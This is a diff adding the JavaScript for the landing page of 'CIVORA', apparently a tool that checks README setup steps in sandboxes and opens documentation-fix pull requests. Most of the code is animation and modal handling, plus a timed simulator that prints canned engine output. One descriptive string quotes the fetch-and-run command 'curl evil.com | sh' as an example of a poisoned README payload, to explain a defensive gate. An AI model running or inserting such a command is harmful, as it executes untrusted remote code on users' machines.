+  var target = 0, displayed = 0, previous = -1, raf = 0, lastTime = 0, desiredTime = 0, forceSeek = false;
+  var decodeTimer = 0, decodeStart = 0, entranceTimer = 0;
+  var passive = {passive:true};
+  var placeNotes=document.getElementById('placeNotes'), placeCopy=document.getElementById('placeCopy');
+  var closePlace=document.getElementById('closePlace'), previousPlace=document.getElementById('previousPlace'), nextPlace=document.getElementById('nextPlace');
+  var placeTriggers=document.querySelectorAll('[data-place]'), placeTrigger=null, activePlace=0, noteClosing=false, noteCloseTimer=0, noteChangeTimer=0;
+  var places=[
+    {
+      name: 'Isolated Sandbox',
+      kind: '01 / ISOLATED EXECUTION',
+      deck: 'Reality Before Reasoning.',
+      history: 'CIVORA extracts setup instructions from README.md and executes them inside an isolated container that behaves like a fresh contributor\'s machine. It establishes execution reality rather than trusting probabilistic assumptions.',
+      detail: 'Persistent shell execution sessions, command-by-command exit code collection, and exact runtime state inspection before and after every documented step.',
+      question: 'Every documented instruction is tested against real execution rather than accepted based on assumptions.'
+    },
+    {
+      name: 'CI Drift Radar',
+      kind: '02 / DOCUMENTATION INTELLIGENCE',
+      deck: 'Find What CI Hides.',
+      history: 'A repository can display a green GitHub Actions badge while a human contributor fails. CIVORA systematically compares human setup instructions against actual repository configuration and CI workflows to detect the hidden gap.',
+      detail: 'Discovers runtime version drift (.nvmrc vs README), uncopied .env configuration, package manager mismatches (npm vs pnpm vs poetry), and missing system-level dependencies.',
+      question: 'Maintainers can see exactly where documentation and actual repository requirements disagree.'
+    },
+    {
+      name: 'Counterfactual Proof Engine',
+      kind: '03 / VERIFIED REMEDIATION',
+      deck: 'Prove the Fix First.',
+      history: 'When an instruction fails, CIVORA identifies the failure category and tests possible atomic interventions in the live sandbox. An intervention is considered verified only after successful exit-code 0 execution.',
+      detail: 'Deterministic error classification (MISSING_ENV, VERSION_MISMATCH, LOCKFILE_MISMATCH), verified intervention registry, and exact line-level Markdown AST target coordinates.',
+      question: 'A proposed fix becomes eligible for documentation repair only after proven sandbox verification.'
+    },
+    {
+      name: 'Zero-Trust Provenance Gate',
+      kind: '04 / SECURITY & RELEASE',
+      deck: 'Trust the Evidence, Not the Output.',
+      history: 'Attackers can embed malicious shell payloads in README files or poisoned terminal outputs (e.g. curl evil.com | sh). The Zero-Trust Provenance Gate strictly validates proposed documentation commands against the independently verified intervention registry.',
+      detail: 'Rejects unverified commands, defends against indirect prompt injection, preserves original Markdown formatting, and suppresses PR generation for genuine source code defects.',
+      question: 'The final Pull Request contains only minimal, evidence-backed documentation changes and an auto-generated devcontainer.'
+    }
+  ];
+  function c01(v) { return Math.max(0, Math.min(1, v)); }
+  function ramp(p,a,b) { return c01((p-a)/(b-a)); }
+  function out3(t) { return 1-Math.pow(1-t,3); }
+  function inOut(t) { return t<.5 ? 4*t*t*t : 1-Math.pow(-2*t+2,3)/2; }
+  function map(points,p) {
+    var i;
+    for(i=1;i<points.length;i++) if(p<=points[i][0]) return points[i-1][1]+(points[i][1]-points[i-1][1])*ramp(p,points[i-1][0],points[i][0]);
+    return points[points.length-1][1];
+  }
+  function live(el,on) {
+    if(el.classList.contains('live')!==on) {
+      el.classList.toggle('live',on);
+      el.setAttribute('aria-hidden',on?'false':'true');
+    }
+  }
+  function flow() { return window.matchMedia('(max-width:1000px),(max-aspect-ratio:12/10) and (max-width:1200px)').matches; }
+  function fit() {
+    var fw=frame.clientWidth, fh=frame.clientHeight, w=fw, h=fh, wasFlow=isFlow;
+    isFlow=flow();
+    if(failed) frame.classList.remove('media-failed');
+    var pos=window.getComputedStyle(poster).objectPosition.split(' ');
+    baseX=parseFloat(pos[0]) || 50; baseY=parseFloat(pos[1]) || 50;
+    if(failed) frame.classList.add('media-failed');
+    rs.setProperty('--k',Math.min(fw/1280,fh/720));
+    if(isFlow) {
+      spots.style.cssText=''; rs.setProperty('--s','1'); rs.setProperty('--sw','100%'); rs.setProperty('--sh','100%');
+    } else {
+      var ar=film.videoWidth && film.videoHeight ? film.videoWidth/film.videoHeight : 16/9;
+      var cw=Math.max(fw,fh*ar), ch=cw/ar;
+      spots.style.width=cw+'px'; spots.style.height=ch+'px';
+      spots.style.left=(fw-cw)*baseX/100+'px'; spots.style.top=(fh-ch)*baseY/100+'px';
+      spots.style.right='auto'; spots.style.bottom='auto';
+      var s=w/h>=1280/720 ? h/720 : w/1280;
+      rs.setProperty('--s',s); rs.setProperty('--sw',w/s+'px'); rs.setProperty('--sh',h/s+'px');
+      film.style.objectPosition='';
+    }
+    if(wasFlow && !isFlow && menuOpen) setMenu(false);
+  }
+  function setMenu(open) {
+    if(!open && mnav.contains(document.activeElement)) burger.focus({preventScroll:true});
+    menuOpen=!!open;
+    mnav.classList.toggle('open',menuOpen);
+    burger.setAttribute('aria-expanded',menuOpen?'true':'false');
+    burger.setAttribute('aria-label',menuOpen?'Close navigation':'Open navigation');
+    mnav.setAttribute('aria-hidden',menuOpen?'false':'true');
+    if(menuOpen) {
+      mnav.removeAttribute('inert');stage.querySelector('.body').setAttribute('inert','');stage.querySelector('.hudgroup').setAttribute('inert','');eco.setAttribute('inert','');
+    } else {
+      mnav.setAttribute('inert','');stage.querySelector('.body').removeAttribute('inert');stage.querySelector('.hudgroup').removeAttribute('inert');eco.removeAttribute('inert');
+    }
+    var i; for(i=0;i<menuLinks.length;i++) menuLinks[i].tabIndex=menuOpen?0:-1;
+  }
+  burger.addEventListener('click',function(){setMenu(!menuOpen);});
+  function maxScroll() { return Math.max(1,document.documentElement.scrollHeight-window.innerHeight); }
+  function scrollToProgress(p) {
+    setMenu(false);
+    frame.scrollLeft=0;frame.scrollTop=0;
+    try { window.scrollTo({top:maxScroll()*p,behavior:reduced?'auto':'smooth'}); }
+    catch(e) { window.scrollTo(0,maxScroll()*p); }
+  }
+  var progressLinks=document.querySelectorAll('[data-progress]'), j;
+  for(j=0;j<progressLinks.length;j++) progressLinks[j].addEventListener('click',function(e){e.preventDefault();scrollToProgress(parseFloat(this.getAttribute('data-progress')));});
+  for(j=0;j<menuLinks.length;j++) menuLinks[j].addEventListener('click',function(){setMenu(false);});
+  document.addEventListener('pointerdown',function(e){if(menuOpen && !mnav.contains(e.target) && !burger.contains(e.target)) setMenu(false);});
+  function openDialog(trigger) {
+    if(!dialog) {
+      openWorkspaceModal();
+      return;
+    }
+    restoreTrigger=mnav.contains(trigger)?burger:trigger;
+    setMenu(false);
+    if(typeof dialog.showModal==='function') dialog.showModal();
+    else { dialog.setAttribute('open',''); dialog.setAttribute('role','dialog'); dialog.setAttribute('aria-modal','true'); frame.setAttribute('inert',''); }
+    document.body.style.overflowY='hidden'; if(closeBrief) closeBrief.focus();
+  }
+  function closeDialog() {
+    if(!dialog || !dialog.hasAttribute('open')) return;
+    if(typeof dialog.close==='function') dialog.close(); else dialog.removeAttribute('open');
+    frame.removeAttribute('inert'); document.body.style.overflowY='';
+    if(restoreTrigger) restoreTrigger.focus({preventScroll:true});
+  }
+  var briefLinks=document.querySelectorAll('a[href="#contact"]');
+  for(j=0;j<briefLinks.length;j++) briefLinks[j].addEventListener('click',function(e){e.preventDefault();openDialog(this);});
+  if(closeBrief) closeBrief.addEventListener('click',closeDialog);
+  if(dialog) {
+    dialog.addEventListener('cancel',function(e){e.preventDefault();closeDialog();});
+    dialog.addEventListener('click',function(e){
+      var r=dialog.getBoundingClientRect();
+      if(e.target===dialog && (e.clientX<r.left || e.clientX>r.right || e.clientY<r.top || e.clientY>r.bottom)) closeDialog();
+    });
+  }
+  function writePlace(index) {
+    var data=places[index], i;
+    document.getElementById('place-title').textContent=data.name;
+    document.getElementById('place-kind').textContent=data.kind;
+    document.getElementById('place-deck').textContent=data.deck;
+    document.getElementById('place-history').textContent=data.history;
+    document.getElementById('place-detail').textContent=data.detail;
+    document.getElementById('place-question').textContent=data.question;
+    document.getElementById('place-count').textContent='0'+(index+1)+' / 04';
+    for(i=0;i<placeTriggers.length;i++) placeTriggers[i].setAttribute('aria-expanded',placeNotes.hasAttribute('open') && parseInt(placeTriggers[i].getAttribute('data-place'),10)===index?'true':'false');
+  }
+  function changePlace(index,animate) {
+    activePlace=(index+places.length)%places.length;
+    window.clearTimeout(noteChangeTimer);
+    if(animate && !reduced) {
+      placeCopy.classList.add('is-changing');
+      noteChangeTimer=window.setTimeout(function(){writePlace(activePlace);placeCopy.classList.remove('is-changing');},120);
+    } else {writePlace(activePlace);placeCopy.classList.remove('is-changing');}
+  }
+  function openPlace(trigger) {
+    if(noteClosing || dialog.hasAttribute('open')) return;
+    placeTrigger=trigger;setMenu(false);
+    changePlace(parseInt(trigger.getAttribute('data-place'),10)||0,false);
+    placeNotes.classList.remove('is-closing');
+    if(typeof placeNotes.showModal==='function') placeNotes.showModal();
+    else {placeNotes.setAttribute('open','');placeNotes.setAttribute('role','dialog');placeNotes.setAttribute('aria-modal','true');frame.setAttribute('inert','');}
+    document.body.style.overflowY='hidden';frame.classList.add('notes-open');
+    placeNotes.scrollTop=0;writePlace(activePlace);
+    void placeNotes.offsetWidth;placeNotes.classList.add('is-open');
+    closePlace.focus({preventScroll:true});
+  }
+  function finishPlaceClose() {
+    window.clearTimeout(noteCloseTimer);window.clearTimeout(noteChangeTimer);
+    if(typeof placeNotes.close==='function') placeNotes.close();else placeNotes.removeAttribute('open');
+    placeNotes.classList.remove('is-open','is-closing');placeCopy.classList.remove('is-changing');
+    frame.classList.remove('notes-open');frame.removeAttribute('inert');document.body.style.overflowY='';noteClosing=false;
+    var i;for(i=0;i<placeTriggers.length;i++)placeTriggers[i].setAttribute('aria-expanded','false');
+    if(placeTrigger && !placeTrigger.disabled && window.getComputedStyle(placeTrigger).visibility!=='hidden')placeTrigger.focus({preventScroll:true});
+    else if(window.getComputedStyle(burger).display!=='none')burger.focus({preventScroll:true});
+    else stage.querySelector('.brand').focus({preventScroll:true});
+    frame.scrollLeft=0;frame.scrollTop=0;
+  }
+  function closePlaceNotes() {
+    if(!placeNotes.hasAttribute('open') || noteClosing)return;
+    noteClosing=true;placeNotes.classList.remove('is-open');placeNotes.classList.add('is-closing');
+    if(reduced)finishPlaceClose();else noteCloseTimer=window.setTimeout(finishPlaceClose,170);
+  }
+  for(j=0;j<placeTriggers.length;j++) {
+    placeTriggers[j].addEventListener('click',function(){openPlace(this);});
+    if(placeTriggers[j].getAttribute('role')==='button')placeTriggers[j].addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '||e.key==='Spacebar'){e.preventDefault();openPlace(this);}});
+  }
+  closePlace.addEventListener('click',closePlaceNotes);
+  previousPlace.addEventListener('click',function(){if(!noteClosing)changePlace(activePlace-1,true);});
+  nextPlace.addEventListener('click',function(){if(!noteClosing)changePlace(activePlace+1,true);});
+  placeNotes.addEventListener('cancel',function(e){e.preventDefault();closePlaceNotes();});
+  placeNotes.addEventListener('click',function(e){
+    var r=placeNotes.getBoundingClientRect();
+    if(e.target===placeNotes&&(e.clientX<r.left||e.clientX>r.right||e.clientY<r.top||e.clientY>r.bottom))closePlaceNotes();
+  });
+  document.addEventListener('keydown',function(e){
+    if(placeNotes.hasAttribute('open')) {
+      if(e.key==='Escape'){e.preventDefault();closePlaceNotes();}
+      if(e.key==='Tab') {
+        if(e.shiftKey && document.activeElement===closePlace){e.preventDefault();nextPlace.focus();}
+        else if(!e.shiftKey && document.activeElement===nextPlace){e.preventDefault();closePlace.focus();}
+      }
+      if(!noteClosing && !e.altKey && !e.ctrlKey && !e.metaKey) {
+        if(e.key==='ArrowRight'){e.preventDefault();changePlace(activePlace+1,true);}
+        if(e.key==='ArrowLeft'){e.preventDefault();changePlace(activePlace-1,true);}
+      }
+      return;
+    }
+    if(dialog.hasAttribute('open')) {
+      if(e.key==='Escape') {e.preventDefault();closeDialog();}
+      if(e.key==='Tab') {e.preventDefault();closeBrief.focus();}
+      return;
+    }
+    if(e.key==='Escape' && menuOpen) {setMenu(false);burger.focus();}
+    if(e.key==='Tab' && menuOpen) {
+      if(e.shiftKey && document.activeElement===burger) {e.preventDefault();menuLinks[menuLinks.length-1].focus();}
+      else if(!e.shiftKey && document.activeElement===burger) {e.preventDefault();menuLinks[0].focus();}
+      else if(e.shiftKey && document.activeElement===menuLinks[0]) {e.preventDefault();burger.focus();}
+      else if(!e.shiftKey && document.activeElement===menuLinks[menuLinks.length-1]) {e.preventDefault();burger.focus();}
+    }
+  });
+  var annot=frame.querySelector('.annot'), annotations=annot.querySelectorAll('span'), ghost=frame.querySelector('.ghost');
+  var labels=['STRUCTURE','& DEPENDENCIES'];
+  function finishEntrance() {
+    root.classList.add('motion-done');
+    var nodes=frame.querySelectorAll('.cta,.sub,.scroll,.bar,.headline,.pill,.annot'), i;
+    for(i=0;i<nodes.length;i++) {nodes[i].style.willChange='auto';void nodes[i].offsetHeight;nodes[i].style.willChange='';}
+  }
+  function finishDecode() {
+    window.clearTimeout(decodeStart);window.clearInterval(decodeTimer);
+    annotations[0].textContent=labels[0];annotations[1].textContent=labels[1];ghost.style.opacity='0';
+  }
+  if(reduced) {finishEntrance();finishDecode();}
+  else {
+    annotations[0].textContent='';annotations[1].textContent='';
+    decodeStart=window.setTimeout(function(){
+      var n=0, chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ#/\\<>_'; ghost.style.opacity='1';
+      decodeTimer=window.setInterval(function(){
+        n++;
+        var i,k,txt;
+        for(i=0;i<2;i++) {
+          txt=labels[i].slice(0,n);
+          for(k=0;k<Math.min(2,labels[i].length-n);k++) txt+=chars.charAt(Math.floor(Math.random()*chars.length));
+          annotations[i].textContent=txt;
+        }
+        if(n>=labels[1].length) finishDecode();
+      },55);
+    },1340);
+    entranceTimer=window.setTimeout(finishEntrance,2300);
+  }
+  function still(p) {
+    var next=p<.15?0:p<.72?1:2;
+    if(next!==stillIndex) {stillIndex=next;poster.src=STILLS[next];}
+  }
+  function seek() {
+    if(!ready || film.seeking || !isFinite(duration)) return;
+    if(forceSeek || Math.abs(film.currentTime-desiredTime)>.0005) {
+      forceSeek=false;
+      try {film.currentTime=desiredTime;} catch(e) {ready=false;}
+    }
+  }
+  function render(p) {
+    if(p===previous) return;
+    previous=p;
+    var h=out3(ramp(p,0,.11));
+    rs.setProperty('--ho',1-h);rs.setProperty('--hy',(-56*h)+'px');
+    frame.setAttribute('data-hero',h>.995?'off':'on');
+    var bo=c01(1-ramp(p,.12,.2)+ramp(p,.76,.84));
+    rs.setProperty('--bo',bo);frame.setAttribute('data-bar',bo<.01?'off':'on');
+    if(bo<.01 && menuOpen) setMenu(false);
+    var enter=out3(ramp(p,.15,.31)), leave=out3(ramp(p,.47,.57)), i, q;
+    live(vision,enter>0 && leave<1);
+    vision.style.opacity=1-leave;
+    vision.style.transform='translateY('+(-18*leave)+'px) scale('+(1+.14*leave)+')';
+    tag.style.opacity=enter;tag.style.transform='translateY('+(10*(1-enter))+'px)';
+    for(i=0;i<titleLines.length;i++) {
+      q=out3(ramp(enter,.12+i*.13,.62+i*.13));
+      titleLines[i].style.transform='translate3d(0,'+(110*(1-q))+'%,0)';
+    }
+    q=out3(ramp(enter,.6,1));visionP.style.opacity=q;visionP.style.transform='translateY('+(12*(1-q))+'px)';
+    veilV.style.opacity=Math.min(enter,1-leave);
+    var city=ramp(p,.80,.95);live(eco,city>0);eco.style.opacity=city>0?1:0;
+    q=out3(ramp(city,0,.55));ecoTop.style.opacity=q;ecoTop.style.transform='translateY('+(22*(1-q))+'px)';
+    for(i=0;i<pins.length;i++) {
+      q=out3(ramp(city,.3+i*.12,.62+i*.12));
+      pins[i].style.opacity=q;pins[i].style.transform='scale('+(.7+.3*q)+')';
+      pins[i].disabled=q<.5;pins[i].classList.toggle('is-ready',q>=.5);
+    }
+    veilE.style.opacity=city;
+    if(isFlow) {
+      var ox=baseX-(baseX-26)*inOut(ramp(p,.68,.9));
+      film.style.objectPosition=ox+'% '+baseY+'%';
+      rs.setProperty('--fallback-x',ox+'%');rs.setProperty('--fallback-y',baseY+'%');
+    } else {
+      film.style.objectPosition='';rs.setProperty('--fallback-x',baseX+'%');rs.setProperty('--fallback-y',baseY+'%');
+    }
+    if(!ready) still(p);
+    desiredTime=map(FILM_MAP,p)*Math.max(0,duration-.05);
+    seek();
+  }
+  function readScroll() {target=c01((window.pageYOffset || document.documentElement.scrollTop || 0)/maxScroll());}
+  function tick(now) {
+    raf=0;
+    var dt=lastTime?Math.min(64,now-lastTime):16.667;lastTime=now;
+    var k=reduced?1:1-Math.pow(1-.11,dt/16.667);
+    displayed+=(target-displayed)*k;
+    if(Math.abs(target-displayed)<.00001) displayed=target;
+    render(displayed);seek();
+    if(Math.abs(target-displayed)>.00001 || (ready && film.seeking)) raf=window.requestAnimationFrame(tick);
+    else lastTime=0;
+  }
+  function kick() {if(!raf) raf=window.requestAnimationFrame(tick);}
+  window.addEventListener('scroll',function(){readScroll();kick();},passive);
+  // The fixed canvas is never a scroll container, even when a UA reveals focused controls.
+  frame.addEventListener('scroll',function(){if(frame.scrollLeft)frame.scrollLeft=0;if(frame.scrollTop)frame.scrollTop=0;},passive);
+  function resize() {fit();readScroll();previous=-1;render(displayed);kick();}
+  window.addEventListener('resize',resize,passive);
+  window.addEventListener('orientationchange',function(){window.setTimeout(resize,60);},passive);
+  if(window.visualViewport) window.visualViewport.addEventListener('resize',resize,passive);
+  film.addEventListener('seeked',function(){
+    if(ready && Math.abs(film.currentTime-desiredTime)>.0005) kick();
+  });
+  function showDecodedFrame() {
+    if(!ready) return;
+    if(typeof film.requestVideoFrameCallback==='function') {
+      film.requestVideoFrameCallback(function(){if(ready) film.classList.add('on');});
+      window.setTimeout(function(){if(ready && film.readyState>=2) film.classList.add('on');},180);
+    } else window.requestAnimationFrame(function(){if(ready) film.classList.add('on');});
+  }
+  function makeReady() {
+    if(ready || failed) return;
+    film.pause();duration=isFinite(film.duration)?film.duration:10;ready=true;
+    fit();previous=-1;forceSeek=true;render(displayed);showDecodedFrame();kick();
+  }
+  film.addEventListener('loadeddata',function(){
+    if(/iPad|iPhone|iPod/.test(navigator.userAgent)) {
+      var play=film.play();
+      if(play && play.then) play.then(makeReady,function(){makeReady();});else makeReady();
+    } else makeReady();
+  });
+  function useOriginal() {
+    if(fallbackUsed) {failMedia();return;}
+    fallbackUsed=true;ready=false;film.classList.remove('on');film.src=FILM_ORIGINAL;film.load();
+  }
+  function failMedia() {
+    ready=false;failed=true;film.pause();film.classList.remove('on');
+    frame.classList.add('media-failed');previous=-1;render(displayed);kick();
+  }
+  film.addEventListener('error',function(){if(!fallbackUsed)useOriginal();else failMedia();});
+  film.muted=true;film.defaultMuted=true;
+  if(window.fetch && window.URL && window.URL.createObjectURL) {
+    window.fetch(FILM_SRC,{mode:'cors'}).then(function(response){
+      if(!response.ok) throw new Error('Film unavailable');return response.blob();
+    }).then(function(blob){
+      blobURL=window.URL.createObjectURL(blob);film.src=blobURL;film.load();
+    }).catch(useOriginal);
+  } else useOriginal();
+  function motionChange(e) {
+    reduced=e.matches;
+    if(reduced){finishDecode();window.clearTimeout(entranceTimer);finishEntrance();}
+    previous=-1;kick();
+  }
+  if(reduceQuery.addEventListener)reduceQuery.addEventListener('change',motionChange);
+  else if(reduceQuery.addListener)reduceQuery.addListener(motionChange);
+  window.addEventListener('pagehide',function(e){if(!e.persisted && blobURL)window.URL.revokeObjectURL(blobURL);});
+  // Warm registered fallback frames without changing the opening plate.
+  for(j=1;j<STILLS.length;j++){var warm=new Image();warm.src=STILLS[j];}
+  fit();readScroll();displayed=target;render(displayed);kick();
+
+  // CIVORA Application Overlays & Scenario Engine
+  var workspaceModal = document.getElementById('workspaceModal');
+  var radarModal = document.getElementById('radarModal');
+  var benchmarkModal = document.getElementById('benchmarkModal');
+  
+  function openWorkspaceModal() {
+    setMenu(false);
+    if(placeNotes.hasAttribute('open')) closePlaceNotes();
+    if(typeof workspaceModal.showModal === 'function') workspaceModal.showModal();
+    else workspaceModal.setAttribute('open', '');
+    document.body.style.overflowY = 'hidden';
+  }
+  
+  function closeWorkspaceModal() {
+    if(typeof workspaceModal.close === 'function') workspaceModal.close();
+    else workspaceModal.removeAttribute('open');
+    document.body.style.overflowY = '';
+  }
+
+  function openRadarModal() {
+    setMenu(false);
+    if(typeof radarModal.showModal === 'function') radarModal.showModal();
+    else radarModal.setAttribute('open', '');
+    document.body.style.overflowY = 'hidden';
+  }
+
+  function closeRadarModal() {
+    if(typeof radarModal.close === 'function') radarModal.close();
+    else radarModal.removeAttribute('open');
+    document.body.style.overflowY = '';
+  }
+
+  function openBenchmarkModal() {
+    setMenu(false);
+    if(typeof benchmarkModal.showModal === 'function') benchmarkModal.showModal();
+    else benchmarkModal.setAttribute('open', '');
+    document.body.style.overflowY = 'hidden';
+  }
+
+  function closeBenchmarkModal() {
+    if(typeof benchmarkModal.close === 'function') benchmarkModal.close();
+    else benchmarkModal.removeAttribute('open');
+    document.body.style.overflowY = '';
+  }
+
+  var wsOpenTriggers = document.querySelectorAll('.open-workspace-trigger, a[href="#workspace"], #btnOpenWorkspace');
+  for (var k = 0; k < wsOpenTriggers.length; k++) {
+    wsOpenTriggers[k].addEventListener('click', function(e) { e.preventDefault(); openWorkspaceModal(); });
+  }
+
+  var bmOpenTriggers = document.querySelectorAll('.open-benchmark-trigger, a[href="#benchmark"], #navBenchmark');
+  for (var k = 0; k < bmOpenTriggers.length; k++) {
+    bmOpenTriggers[k].addEventListener('click', function(e) { e.preventDefault(); openBenchmarkModal(); });
+  }
+
+  var radarOpenTriggers = document.querySelectorAll('.open-radar-trigger, a[href="#radar"]');
+  for (var k = 0; k < radarOpenTriggers.length; k++) {
+    radarOpenTriggers[k].addEventListener('click', function(e) { e.preventDefault(); openRadarModal(); });
+  }
+
+  document.getElementById('closeWorkspace').addEventListener('click', closeWorkspaceModal);
+  document.getElementById('closeRadar').addEventListener('click', closeRadarModal);
+  document.getElementById('closeBenchmark').addEventListener('click', closeBenchmarkModal);
+
+  // Direct URL routing checks
+  if (window.location.pathname === '/mission-control' || window.location.hash === '#workspace') {
+    setTimeout(openWorkspaceModal, 100);
+  } else if (window.location.pathname === '/radar' || window.location.hash === '#radar') {
+    setTimeout(openRadarModal, 100);
+  } else if (window.location.pathname === '/benchmark' || window.location.hash === '#benchmark') {
+    setTimeout(openBenchmarkModal, 100);
+  }
+
+  // Interactive Scenario Simulator in Mission Control
+  var activeScenario = 'pulse-api';
+  var scenarioButtons = document.querySelectorAll('.scenario-btn');
+  for (var i = 0; i < scenarioButtons.length; i++) {
+    scenarioButtons[i].addEventListener('click', function() {
+      for (var j = 0; j < scenarioButtons.length; j++) scenarioButtons[j].classList.remove('active');
+      this.classList.add('active');
+      activeScenario = this.getAttribute('data-scenario');
+      document.getElementById('targetRepoText').textContent = this.getAttribute('data-repo');
+      resetEngineState();
+    });
+  }
+
+  function resetEngineState() {
+    var term = document.getElementById('terminalOutput');
+    term.innerHTML = '<div style="color:#38BDF8;">[ENGINE] Ready. Target loaded: ' + document.getElementById('targetRepoText').textContent + '</div>';
+    document.getElementById('prNotice').style.display = 'none';
+    var steps = document.querySelectorAll('.pipeline-step');
+    for (var i = 0; i < steps.length; i++) {
+      steps[i].querySelector('.step-badge').textContent = 'PENDING';
+      steps[i].querySelector('.step-badge').className = 'step-badge';
+    }
+  }
+
+  document.getElementById('btnRunEngine').addEventListener('click', function() {
+    var term = document.getElementById('terminalOutput');
+    var btn = this;
+    btn.disabled = true;
+    btn.textContent = 'RUNNING ENGINE...';
+    term.innerHTML = '<div style="color:#38BDF8;">[ENGINE] Ingesting repository instructions and CI workflows...</div>';
+
+    setTimeout(function() {
+      var s1 = document.getElementById('step-1');
+      s1.querySelector('.step-badge').textContent = 'VERIFIED';
+      s1.querySelector('.step-badge').className = 'step-badge verified';
+      term.innerHTML += '<div>[STAGE 01] AST extraction completed: README.md vs .github/workflows/ci.yml</div>';
+      term.innerHTML += '<div style="color:#A855F7;">[STAGE 01 DRIFT] Discrepancy isolated: setup instruction version drift detected.</div>';
+    }, 700);
+
+    setTimeout(function() {
+      var s2 = document.getElementById('step-2');
+      s2.querySelector('.step-badge').textContent = 'VERIFIED';
+      s2.querySelector('.step-badge').className = 'step-badge verified';
+      term.innerHTML += '<div>[STAGE 02] Spawning pristine Docker container (debian:bookworm-slim)...</div>';
+      term.innerHTML += '<div style="color:#EF4444;">[SANDBOX FAILURE] Command exited with code 1. Missing runtime / dependency.</div>';
+    }, 1800);
+
+    setTimeout(function() {
+      var s3 = document.getElementById('step-3');
+      var s4 = document.getElementById('step-4');
+      s3.querySelector('.step-badge').textContent = 'VERIFIED';
+      s3.querySelector('.step-badge').className = 'step-badge verified';
+      s4.querySelector('.step-badge').textContent = 'VERIFIED';
+      s4.querySelector('.step-badge').className = 'step-badge verified';
+      term.innerHTML += '<div style="color:#10B981;">[STAGE 03 PROOF] Candidate intervention proved: exit code 0 achieved in container.</div>';
+      term.innerHTML += '<div>[STAGE 04 CONDENSE] 1,420 noisy build lines compressed to diagnostic root cause.</div>';
+    }, 3200);
+
+    setTimeout(function() {
+      var s5 = document.getElementById('step-5');
+      var s6 = document.getElementById('step-6');
+      s5.querySelector('.step-badge').textContent = 'VERIFIED';
+      s5.querySelector('.step-badge').className = 'step-badge verified';
+      
+      if (activeScenario === 'red-team') {
+        s6.querySelector('.step-badge').textContent = 'BLOCKED';
+        s6.querySelector('.step-badge').className = 'step-badge blocked';
+        term.innerHTML += '<div style="color:#F59E0B;font-weight:600;">[SECURITY ALERT] Malicious shell injection detected in output!</div>';
+        term.innerHTML += '<div style="color:#EF4444;font-weight:600;">[ZERO-TRUST GATE] Unverified command blocked from documentation PR. Protected.</div>';
+        btn.disabled = false;
+        btn.textContent = 'RUN REPAIR ENGINE';
+      } else if (activeScenario === 'clean-cli') {
+        s6.querySelector('.step-badge').textContent = 'SUPPRESSED';
+        s6.querySelector('.step-badge').className = 'step-badge suppressed';
+        term.innerHTML += '<div style="color:#F59E0B;">[POLICY GATE] Defect identified as genuine CODE_DEFECT (SyntaxError at HEAD).</div>';
+        term.innerHTML += '<div>[SUPPRESSION] Documentation PR withheld to prevent maintainer spam.</div>';
+        btn.disabled = false;
+        btn.textContent = 'RUN REPAIR ENGINE';
+      } else {
+        s6.querySelector('.step-badge').textContent = 'VERIFIED';
+        s6.querySelector('.step-badge').className = 'step-badge verified';
+        term.innerHTML += '<div style="color:#38BDF8;">[STAGE 05 GEMMA] Gemma 4 produces minimal AST patch via xgrammar constrained JSON.</div>';
+        term.innerHTML += '<div style="color:#10B981;">[STAGE 06 ZERO-TRUST] Provenance gate verified: patch matches tested intervention hash.</div>';
+
+        setTimeout(function() {
+          var s7 = document.getElementById('step-7');
+          s7.querySelector('.step-badge').textContent = 'VERIFIED';
+          s7.querySelector('.step-badge').className = 'step-badge verified';
+          term.innerHTML += '<div style="color:#10B981;font-weight:600;">[STAGE 07 VERIFIED] Clean-room sandbox re-execution PASSED with zero errors!</div>';
+          term.innerHTML += '<div style="color:#38BDF8;font-weight:600;">[GITHUB PR CREATED] Pull Request #14 submitted with minimal diff and synthesized .devcontainer.json</div>';
+          document.getElementById('prNotice').style.display = 'block';
+          btn.disabled = false;
+          btn.textContent = 'RUN REPAIR ENGINE';
+        }, 1200);
+      }
+    }, 4500);
+  });
+
+  window.openWorkspaceModal = openWorkspaceModal;
+  window.openRadarModal = openRadarModal;
+  window.openBenchmarkModal = openBenchmarkModal;
+})();
+</script>
+</body>
+</html>
